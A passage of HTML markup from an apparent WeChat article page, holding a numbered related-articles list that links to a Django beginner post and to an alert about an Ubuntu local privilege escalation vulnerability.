border-box;"><span style="font-size: 14px;">1</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483671&amp;idx=1&amp;sn=5392d3c543eff0903b5e3871b97fe917&amp;chksm=fa3941cdcd4ec8db0b769837d404395ed87f23dbe56161717b02265a40f23d955b7cce55fbf2&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 14px;text-decoration: underline;"><span style="font-size: 14px;">Django入门之旅-启程</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="display: table-row;width: 100%;box-sizing: border-box;"><section class="" style="display: table-cell;vertical-align: top;width: 10%;border-width: 1px;border-radius: 0px;border-style: none;border-color: rgb(62, 62, 62);box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 6px 0%;font-size: 8px;box-sizing: border-box;"><section class="" style="display: inline-block;border-width: 2px;border-style: dotted;border-color: rgba(248, 248, 248, 0);width: 1.6em;height: 1.6em;border-radius: 0.3em;font-size: 12px;line-height: 1.5em;color: rgb(255, 255, 255);background-color: rgb(95, 156, 239);box-sizing: border-box;"><p style="box-sizing: border-box;"><span style="font-size: 14px;">2</span></p></section></section></section></section><section class="" style="display: table-cell;vertical-align: top;width: 90%;border-style: none;border-width: 1px;border-radius: 0px;border-color: rgb(62, 62, 62);padding-left: 6px;box-sizing: border-box;"><section class="Powered-by-XIUMI V5" style="box-sizing: border-box;" powered-by="xiumi.us"><section class="" style="margin: 5px 0%;box-sizing: border-box;"><section class="" style="text-align: justify;padding-right: 5px;padding-left: 5px;font-size: 14px;line-height: 1.8;box-sizing: border-box;"><p style="white-space: normal;box-sizing: border-box;"><a href="http://mp.weixin.qq.com/s?__biz=MzUyMzczNzUyNQ==&amp;mid=2247483652&amp;idx=1&amp;sn=b2f2ec90db499e23cfa252e9ee743265&amp;chksm=fa3941decd4ec8c83a268c3480c354a621d515262bcbb5f35e1a2dde8c828bdc7b9011cb5072&amp;scene=21#wechat_redirect" target="_blank" style="font-size: 14px;text-decoration: underline;"><span style="font-size: 14px;">重大漏洞预警：ubuntu最新版本存在本地提权漏洞（已有EXP）　</span></a></p></section></section></section></section></section></section><section class="Powered-by-XIUMI V5" style="display: table-row-group;box-sizing: border-box;" powered-by="xiumi.us"/></section></section></section></section></section></section></section></section></section></section></section></section><p><br/></p>
+        
+</body>
+</html>
